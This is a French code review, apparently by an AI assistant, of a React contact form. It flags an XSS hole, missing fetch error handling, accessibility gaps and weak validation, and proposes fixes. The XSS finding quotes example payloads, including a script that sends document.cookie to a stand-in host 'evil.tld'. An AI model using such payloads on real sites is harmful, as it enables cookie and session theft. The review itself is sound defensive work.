# Revue de code — ContactForm.jsx (aperçu du message après envoi)

**Date :** 2026-05-07 14:30
**Périmètre :** `frontend/src/components/ContactForm.jsx`
**Verdict :** 🔴 bloquants à corriger

## Résumé

L'ajout d'un aperçu du message via `dangerouslySetInnerHTML` ouvre une faille XSS directe : tout ce que l'utilisateur saisit dans `name` ou `message` est injecté tel quel dans le DOM. Cette seule ligne suffit à bloquer le merge. À côté de ça, le formulaire souffre de problèmes d'accessibilité structurels (aucun `<label>`, pas de `htmlFor`/`id`), d'une absence totale de gestion d'erreur réseau (`fetch` sans `await`, sans `.catch`, sans état d'erreur), et d'une validation côté client inexistante. Le composant fait ce qu'il prétend dans le happy path, mais il casse dès qu'on s'écarte de ce chemin ou qu'un utilisateur saisit du contenu non-trivial.

## Findings

### 🔴 Bloquants

**XSS via `dangerouslySetInnerHTML` sur des entrées utilisateur non échappées**
- 📍 `frontend/src/components/ContactForm.jsx:17` et `:56-60`
- **Problème :** `preview` est construit par interpolation directe de `name` et `message` dans une chaîne HTML, puis injecté via `dangerouslySetInnerHTML`. N'importe quel utilisateur peut saisir `<img src=x onerror="alert(document.cookie)">` dans le champ nom ou message et exécuter du JS arbitraire dans la page. Scénario concret : un visiteur tape `<script>fetch('https://evil.tld?c='+document.cookie)</script>` comme message, clique « Envoyer », et le code s'exécute immédiatement dans son propre navigateur. Plus grave si la même valeur est rejouée ailleurs (ex. future page admin qui réaffiche les messages reçus) : XSS stockée transverse.
- **Impact :** Faille XSS exploitable par n'importe quel visiteur, vol de session/cookies si on en ajoute plus tard, exécution de code arbitraire côté client. Bloquant absolu pour la mise en prod.
- **Correction :** Supprimer `dangerouslySetInnerHTML` et laisser React échapper le contenu naturellement. Remplacer le `preview` HTML par un rendu JSX :
  ```jsx
  {submitted && (
    <div className="mt-4 p-4 bg-green-100 rounded" role="status" aria-live="polite">
      <p>Merci <strong>{name}</strong> ! Voici votre message :</p>
      <blockquote className="mt-2 italic">{message}</blockquote>
    </div>
  )}
  ```
  Avec ça, `preview` et `setPreview` deviennent inutiles — on supprime aussi cet état. Note CSP : la meta CSP du projet autorise `'unsafe-inline'` pour les styles, **pas** pour les scripts, donc un `<script>` injecté serait bloqué — mais les vecteurs `onerror`/`onload` sur des balises HTML restent exploitables, donc ne pas s'appuyer là-dessus.

**Aucune gestion d'erreur ni de loading sur le `fetch`**
- 📍 `frontend/src/components/ContactForm.jsx:10-18`
- **Problème :** Le `fetch` n'est ni `await`é, ni `.then/.catch`é. Le `setSubmitted(true)` est appelé synchrone juste après l'appel : l'utilisateur voit « Merci » même si le serveur a répondu 500, si le réseau est down, ou si l'endpoint n'existe pas. Aucun `Content-Type: application/json` n'est envoyé non plus, donc côté backend `JSON.parse` du body échouera selon la stack. Pas non plus de protection contre le double-submit (utilisateur qui clique 3 fois → 3 envois).
- **Impact :** L'utilisateur croit son message envoyé alors qu'il est perdu silencieusement. Aucun feedback en cas d'erreur. Spam involontaire en cas de double-clic.
- **Correction :** Rendre `handleSubmit` async, gérer loading/error explicitement, désactiver le bouton pendant l'envoi, ajouter le bon header :
  ```jsx
  const [status, setStatus] = useState('idle'); // 'idle' | 'sending' | 'success' | 'error'

  const handleSubmit = async (e) => {
    e.preventDefault();
    setStatus('sending');
    try {
      const res = await fetch('/api/contact', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ name, email, message }),
      });
      if (!res.ok) throw new Error(`HTTP ${res.status}`);
      setStatus('success');
    } catch {
      setStatus('error');
    }
  };
  ```
  Puis afficher un message d'erreur visible si `status === 'error'`, et `disabled={status === 'sending'}` sur le bouton.

### 🟠 Importants

**Aucun `<label>` associé aux champs — accessibilité cassée**
- 📍 `frontend/src/components/ContactForm.jsx:23-29`, `:33-39`, `:43-49`
- **Problème :** Les trois champs n'ont qu'un `placeholder` comme indication. Un `placeholder` n'est pas une étiquette accessible : il disparaît dès qu'on tape, n'est pas lu de manière fiable par les lecteurs d'écran sur tous les navigateurs, et a un contraste insuffisant par défaut. Aucun `id` ni `htmlFor` n'est présent, donc même un clic sur un éventuel label futur ne ferait rien. L'attribut `required` est aussi absent partout, ce qui veut dire qu'on peut soumettre un formulaire vide.
- **Impact :** Formulaire inutilisable pour les utilisateurs de lecteurs d'écran, et soumissions vides possibles.
- **Correction :** Ajouter un `<label htmlFor>` visible (ou visuellement caché avec `sr-only` si le design ne veut pas de label) pour chaque champ, mettre les `id` correspondants, et ajouter `required` + un `type="email"` déjà présent qui déclenchera la validation native :
  ```jsx
  <label htmlFor="contact-name" className="block text-sm font-medium">Nom</label>
  <input id="contact-name" type="text" required value={name} ... />
  ```
  Idem pour email et message. Le `<textarea>` mérite aussi un `maxLength` raisonnable (ex. 2000) pour éviter qu'un utilisateur colle 10 Mo de texte.

**Validation côté client absente**
- 📍 `frontend/src/components/ContactForm.jsx:10-18`
- **Problème :** On envoie au backend même si `name`, `email` ou `message` sont vides ou si l'email est mal formé (le `type="email"` aide mais n'est pas déclenché si on n'a pas `required`). Pas de trim non plus : `"   "` passe.
- **Impact :** Requêtes inutiles vers `/api/contact`, données polluées côté serveur.
- **Correction :** Vérifier en début de `handleSubmit` que les trois champs trimés sont non vides, sinon mettre `status` en `'error'` avec un message dédié. La validation native HTML (`required`, `type="email"`) couvre déjà 90 % du besoin si on l'active.

### 🟡 Suggestions

**Réinitialiser le formulaire après succès**
- 📍 `frontend/src/components/ContactForm.jsx:16`
- **Problème :** Après envoi, les champs gardent leur valeur. Si l'utilisateur veut envoyer un second message, il doit tout effacer manuellement.
- **Correction :** Sur succès, `setName(''); setEmail(''); setMessage('');`. Garder `submitted` (ou `status === 'success'`) pour afficher l'aperçu basé sur des variables locales capturées avant le reset si besoin.

**Annoncer le succès aux technologies d'assistance**
- 📍 `frontend/src/components/ContactForm.jsx:56-61`
- **Problème :** Le bloc de confirmation apparaît visuellement mais n'est pas annoncé par les lecteurs d'écran.
- **Correction :** Ajouter `role="status"` et `aria-live="polite"` sur le `<div>` de confirmation (déjà inclus dans le snippet du finding XSS).

**Le `<form>` n'a pas de nom accessible**
- 📍 `frontend/src/components/ContactForm.jsx:21`
- **Problème :** Si plusieurs formulaires coexistent un jour sur la même page, ils seront indiscernables.
- **Correction :** Ajouter `aria-labelledby` pointant vers un titre visible, ou `aria-label="Formulaire de contact"`.

### ⚪ Nits

- `frontend/src/components/ContactForm.jsx:52` — Le bouton n'a pas de `:hover`/`:focus-visible` styling Tailwind (`hover:bg-blue-700 focus-visible:ring-2`). Affordance réduite.
- `frontend/src/components/ContactForm.jsx:28,38,48` — Les `<input>` n'ont pas de classe de focus visible (`focus:ring-2 focus:ring-blue-500 focus:outline-none`). Cohérence avec Tailwind.

## Questions ouvertes

- L'endpoint `/api/contact` existe-t-il déjà côté backend ? Le CLAUDE.md indique qu'il n'y a « pas de backend pour l'instant » — si c'est toujours vrai, le `fetch` part dans le vide et il faudrait soit stub via un service externe (Formspree, Resend) soit cacher le formulaire derrière un feature flag.
- Souhaites-tu garder l'aperçu du message après envoi, ou un simple message « Merci, votre message a été envoyé » suffirait ? Le réafficher textuellement est utile en cas de coupure réseau pour que l'utilisateur puisse copier-coller, mais ça double l'UI.
- Y a-t-il un design Tailwind cible pour les états error/loading déjà défini ailleurs dans l'app (ex. dans un autre formulaire), pour rester cohérent ?
